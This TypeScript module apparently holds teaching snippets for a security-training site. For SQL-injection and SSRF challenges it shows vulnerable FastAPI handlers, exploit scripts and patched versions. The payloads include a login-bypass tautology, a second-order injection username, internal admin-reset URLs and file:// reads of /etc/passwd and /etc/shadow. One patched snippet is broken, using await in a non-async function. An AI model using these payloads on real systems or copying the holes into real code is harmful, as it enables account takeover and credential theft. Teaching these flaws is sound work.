export const sqliLoginBypassVulnerableSnippet = `
class Credentials(BaseModel):
    username: str
    password: str

@router.post("/login/", response_model=str)
async def login(credentials: Credentials) -> str:
    query = f"SELECT * FROM appsec_cheat_codes_user WHERE username = '{credentials.username}' AND password = '{credentials.password}'"
    with db:
        result = db.execute_sql(query).fetchone()
    user = deserialize_user(result)
    if user:
        return Passphrases.sqli1.value

    raise HTTPException(status_code=403, detail="Login failed")`

export const sqliSecondOrderVulnerableSnippet = `
class Credentials(BaseModel):
    username: str
    password: str


class ChangePassword(BaseModel):
    old: str
    new: str
    new_verify: str


@router.post("/register/", response_model=str)
async def register(request: Request, credentials: Credentials) -> str:
    if len(credentials.username.strip()) == 0 or len(credentials.password.strip()) == 0:
        raise HTTPException(status_code=400, detail="Fields cannot be empty")

    with db:
        user = User.create(
            username=credentials.username,
            password=bcrypt.hashpw(credentials.password.encode(), bcrypt.gensalt()),
        )
        session: Session = Session.create(cookie=secrets.token_hex(), user=user)
        request.session[SESSION_IDENTIFIER] = session.cookie
    return "Successfully registered"


@router.post("/change_password/", response_model=str)
async def change_password(request: Request, change_password: ChangePassword) -> str:
    if SESSION_IDENTIFIER not in request.session:
        raise HTTPException(status_code=403, detail="Unauthorized")

    if len(change_password.old.strip()) == 0 or len(change_password.new.strip()) == 0:
        raise HTTPException(status_code=400, detail="Fields cannot be empty")

    if change_password.new != change_password.new_verify:
        raise HTTPException(status_code=400, detail="Passwords do not match")

    cookie = request.session[SESSION_IDENTIFIER]
    with db:
        try:
            session = Session.get(cookie=cookie)
        except DoesNotExist as err:
            raise HTTPException(status_code=403, detail="Unauthorized") from err

        query = f"UPDATE appsec_cheat_codes_user SET password = '{change_password.new}' WHERE username = '{session.user.username}' AND password = '{change_password.old}'"
        db.execute_sql(query)
        hacked_user = User.get(username=SQLI2_USERNAME)

    if timing_safe_compare(hacked_user.password, change_password.new):
        return Passphrases.sqli2.value

    return "Successfully changed password"`

export const ssrfWebhookVulnerableSnippet = `
class UserSuppliedUrl(BaseModel):
    url: str


@router.post("/submit_webhook/", response_model=str)
async def submit_webhook(user_supplied_url: UserSuppliedUrl) -> str:
    if not user_supplied_url.url:
        raise HTTPException(status_code=400, detail="Fields can not be empty")

    url = user_supplied_url.url

    if should_reveal_first_hint(url):
        return FIRST_HINT
    if should_reveal_second_hint(url):
        return SECOND_HINT
    if should_reveal_third_hint(url):
        return THIRD_HINT

    if not await allowed_to_continue_for_ssrf_challenge(
        url, is_valid_internal_url
    ):
        raise HTTPException(
            status_code=400,
            detail=f"Failure: supplied url is invalid ({url})",
        )

    try:
        r = requests.post(url, timeout=TIMEOUT)
        try:
            response_body = r.json()
        except Exception:
            response_body = r.text[:750].strip()

        if timing_safe_compare(response_body, get_ssrf_webhook_expected_response()):
            return Passphrases.ssrf1.value
        else:
            raise HTTPException(
                status_code=400,
                detail=f"Challenge failed. Response body: {response_body}",
            )
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=400, detail=f"Failure: {e}") from e`

export const ssrfLocalFileInclusionVulnerableSnippet = `
class UserSuppliedUrl(BaseModel):
    url: str


@router.post("/submit_api_url/", response_model=str)
async def submit_api_url(user_supplied_url: UserSuppliedUrl) -> str:
    if not user_supplied_url.url:
        raise HTTPException(status_code=400, detail="Fields can not be empty")

    url = user_supplied_url.url

    if should_reveal_first_hint(url):
        return FIRST_HINT

    if not await allowed_to_continue_for_ssrf_challenge(
        url, is_valid_internal_url
    ):
        raise HTTPException(
            status_code=400,
            detail=f"Failure: supplied url is invalid ({url})",
        )

    try:
        requests_session = requests.session()
        requests_session.mount(FILE_SCHEME, local_file_adapter.LocalFileAdapter())
        r = requests_session.get(url, timeout=TIMEOUT)
        response_body = r.text[:750].strip()

        # Read allowed files from disk
        passwd_contents = ""
        shadow_contents = ""

        try:
            with open("/etc/passwd") as f:
                passwd_contents = f.read()
            with open("/etc/shadow") as f:
                shadow_contents = f.read()
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"{e}") from e

        # Check if response matches either file
        if timing_safe_compare(response_body, passwd_contents) or timing_safe_compare(
            response_body, shadow_contents
        ):
            return Passphrases.ssrf2.value
        elif accessed_cat_coin_api(url):
            return response_body
        else:
            raise HTTPException(
                status_code=400,
                detail=f"Challenge failed. Response body: {response_body}",
            )
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=400, detail=f"Failure: {e}") from e`

export const sqliLoginBypassExploitSnippet = `
username = "administrator"
password = "' OR 'a' = 'a"
data = {"username": username, "password": password}

try:
    req = Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        method="POST",
        headers={"Content-Type": "application/json"},
    )

    with urlopen(req) as response:
        print(f"Response: {response.read().decode('utf-8')}")
except URLError as e:
    print(f"Error: {e}")`

export const sqliSecondOrderExploitSnippet = `
def register(username_to_exploit: str, password: str) -> dict:
    username = f"{username_to_exploit}';-- "
    data = {"username": username, "password": password}

    try:
        req = Request(
            urls[0],
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json"},
        )

        with urlopen(req) as response:
            cookies = dict(
                [
                    cookie.split("=", 1)
                    for cookie in response.headers.get("Set-Cookie", "").split("; ")[
                        0:1
                    ]
                ]
            )
            print(f"Response: {response.read().decode('utf-8')}")
            return cookies
    except URLError as e:
        print(f"Error: {e}")
        return {}


def change_password(cookies: dict, password: str) -> None:
    data = {"old": password, "new": password, "new_verify": password}

    try:
        cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        req = Request(
            urls[1],
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json", "Cookie": cookie_string},
        )

        with urlopen(req) as response:
            print(f"Response: {response.read().decode('utf-8')}")
    except URLError as e:
        print(f"Error: {e}")


password = "gotham"
username_to_exploit = "batman"
cookies = register(username_to_exploit, password)
change_password(cookies, password)`

export const ssrfWebhookExploitSnippet = `
for url_payload in [
    "http://internal_api",
    "http://internal_api:12302",
    "http://internal_api:12302/reset_admin_password/",
]:
    data = {"url": url_payload}

    try:
        req = Request(
            url,
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json"},
        )

        with urlopen(req) as response:
            print(f"Response for {url_payload}: {response.read().decode('utf-8')}")
    except URLError as e:
        print(f"Error with {url_payload}: {e}")`

export const ssrfLocalFileInclusionExploitSnippet = `
for custom_url in ["file:///etc/passwd", "file:///etc/shadow"]:
    data = {"url": custom_url}

    try:
        req = Request(
            url,
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json"},
        )

        with urlopen(req) as response:
            print(f"Response for {custom_url}: {response.read().decode('utf-8')}")
    except URLError as e:
        print(f"Error with {custom_url}: {e}")`

export const sqliLoginBypassPatchedSnippet = `
class Credentials(BaseModel):
    username: str
    password: str


@router.post("/login/", response_model=str)
async def login(credentials: Credentials) -> str:
    try:
        with db:
            User.get(username=credentials.username, password=credentials.password)
    except DoesNotExist as err:
        raise HTTPException(status_code=403, detail="Login failed") from err
    else:
        return Passphrases.sqli1.value`

export const sqliSecondOrderPatchedSnippet = `
class Credentials(BaseModel):
    username: str
    password: str


class ChangePassword(BaseModel):
    old: str
    new: str
    new_verify: str


@router.post("/register/", response_model=str)
async def register(request: Request, credentials: Credentials) -> str:
    if len(credentials.username.strip()) == 0 or len(credentials.password.strip()) == 0:
        raise HTTPException(status_code=400, detail="Fields cannot be empty")

    with db:
        user = User.create(
            username=credentials.username,
            password=bcrypt.hashpw(credentials.password.encode(), bcrypt.gensalt()),
        )
        session: Session = Session.create(cookie=secrets.token_hex(), user=user)
        request.session[SESSION_IDENTIFIER] = session.cookie
    return "Successfully registered"


@router.post("/change_password/", response_model=str)
async def change_password(request: Request, change_password: ChangePassword) -> str:
    if SESSION_IDENTIFIER not in request.session:
        raise HTTPException(status_code=403, detail="Unauthorized")

    if len(change_password.old.strip()) == 0 or len(change_password.new.strip()) == 0:
        raise HTTPException(status_code=400, detail="Fields cannot be empty")

    if change_password.new != change_password.new_verify:
        raise HTTPException(status_code=400, detail="Passwords do not match")

    cookie = request.session[SESSION_IDENTIFIER]
    try:
        with db:
            session = Session.get(cookie=cookie)
    except DoesNotExist as err:
        raise HTTPException(status_code=403, detail="Unauthorized") from err

    with db:
        User.update(password=change_password.new).where(
            User.username == session.user.username, User.password == change_password.old
        ).execute()
        try:
            hacked_user = User.get(username=SQLI2_USERNAME)
        except DoesNotExist as err:
            raise HTTPException(status_code=403, detail="Unauthorized") from err

    if timing_safe_compare(hacked_user.password, change_password.new):
        return Passphrases.sqli2.value

    return "Successfully changed password"`

export const ssrfWebhookPatchedSnippet = `
class UserSuppliedUrl(BaseModel):
    url: str


@router.post("/submit_webhook/", response_model=str)
def submit_webhook(user_supplied_url: UserSuppliedUrl) -> str:
    if not user_supplied_url.url:
        raise HTTPException(status_code=400, detail="Fields can not be empty")

    url = user_supplied_url.url

    if not await allowed_to_continue_for_ssrf_challenge(url):
        raise HTTPException(
            status_code=400,
            detail=f"Failure: supplied url is invalid ({url})",
        )

    try:
        r = requests.post(url, timeout=TIMEOUT)
        try:
            response_body = r.json()
        except Exception:
            response_body = r.text[:750].strip()

        if timing_safe_compare(response_body, get_ssrf_webhook_expected_response()):
            return Passphrases.ssrf1.value
        else:
            raise HTTPException(
                status_code=400,
                detail=f"Challenge failed. Response body: {response_body}",
            )
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=400, detail=f"Failure: {e}") from e`

export const ssrfLocalFileInclusionPatchedSnippet = `
class UserSuppliedUrl(BaseModel):
    url: str


@router.post("/submit_api_url/", response_model=str)
async def submit_api_url(user_supplied_url: UserSuppliedUrl) -> str:
    if not user_supplied_url.url:
        raise HTTPException(status_code=400, detail="Fields can not be empty")

    if not await allowed_to_continue_for_ssrf_challenge(
        user_supplied_url.url):
        raise HTTPException(
            status_code=400,
            detail=f"Failure: supplied url is invalid ({user_supplied_url.url})",
        )
    try:
        if user_supplied_url.url not in {
            INTERNAL_API_WITH_PATH_V1,
            INTERNAL_API_WITH_PATH_V2,
        }:
            raise HTTPException(
                status_code=400,
                detail=f"Failure: supplied url is invalid ({user_supplied_url.url})",
            )
        r = requests.get(user_supplied_url.url, timeout=TIMEOUT)
        response_body = r.json()

        # Read allowed files from disk
        passwd_contents = ""
        shadow_contents = ""
        try:
            with open("/etc/passwd") as f:
                passwd_contents = f.read()
            with open("/etc/shadow") as f:
                shadow_contents = f.read()
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"{e}") from e

        # Check if response matches either file
        if timing_safe_compare(response_body, passwd_contents) or timing_safe_compare(
            response_body, shadow_contents
        ):
            return Passphrases.ssrf2.value
        elif accessed_cat_coin_api(user_supplied_url.url):
            return response_body
        else:
            raise HTTPException(
                status_code=400,
                detail=f"Challenge failed. Response body: {response_body}",
            )
    except requests.exceptions.RequestException as e:
        raise HTTPException(status_code=400, detail=f"Failure: {e}") from e`
